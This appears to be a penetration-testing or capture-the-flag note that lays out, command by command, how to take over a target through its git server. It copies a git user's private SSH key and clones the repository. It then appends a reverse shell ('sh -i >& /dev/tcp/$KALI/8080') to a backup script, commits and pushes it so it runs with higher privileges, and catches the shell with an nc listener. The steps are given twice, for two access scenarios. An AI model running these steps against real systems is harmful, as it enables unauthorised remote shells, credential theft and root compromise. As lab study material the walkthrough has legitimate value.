#### Git user exists

A git user appears in the /home directory.

![[Pasted image 20220319230833.png]]

Let's copy the .ssh/id_rsa file to kali, then use it to ssh in.

```bash - kali
chmod 600 id_rsa
```

```bash - kali
ssh git@$TARGET -i id_rsa -p 22
```

Now that we have confirmed this works, we can use GIT SSH to clone the repository down to kali.

```bash - kali
GIT_SSH_COMMAND='ssh -i id_rsa -p 22' git clone git@$TARGET:/git-server
```

![[Pasted image 20221110090941.png]]

```bash - kali
cd git-server
```

Configure our Git identity.
```bash - kali
git config --global user.name "kali"
```

```bash - kali
git config --global user.email "kali@kali.(none)"
```

Echo in our reverse shell.
```bash - kali
echo "sh -i >& /dev/tcp/$KALI/8080 0>&1" >> backups.sh 
```

```bash - kali
chmod +x backups.sh
```

Now we add and commit changes.
```bash - kali
git add -A
```

```bash - kali
git commit -m "pwn"
```

![[Pasted image 20221110091030.png]]

```bash - kali
sudo rlwrap -cAr nc -lvnp 8080
```

```bash - kali
GIT_SSH_COMMAND='ssh -i ../id_rsa -p 43022' git push origin master
```

![[Pasted image 20220319232925.png]]

#### Have commit privs

![[Pasted image 20220319230106.png]]

```bash - kali
git clone file://git-server
```

```bash - kali
ls -la git-server
```

```bash - kali
cd git-server
```

```bash - kali
git log
```

```bash - kali
cat backup.sh
```

```bash - kali
git config --global user.name "$USER"
```

>git config --global user.name "hacker"

```bash - kali
git config --global user.email "$USER@$HOSTNAME.(none)"
```

>git config --global user.email "hacker@targetbox1.(none)"

Run a test command for root execution.
```bash - kali
echo "sh -i >& /dev/tcp/$KALI/8080 0>&1" >> backups.sh 
```

```bash - kali
chmod +x backups.sh 
```

```bash - kali
git add -A
```

```bash - kali
git commit -m "pwn"
```

If this method fails, try [[13._Git Server#Git user exists]]

```bash - kali
sudo rlwrap -cAr nc -lvnp 8080
```

```bash - target
git push origin master
```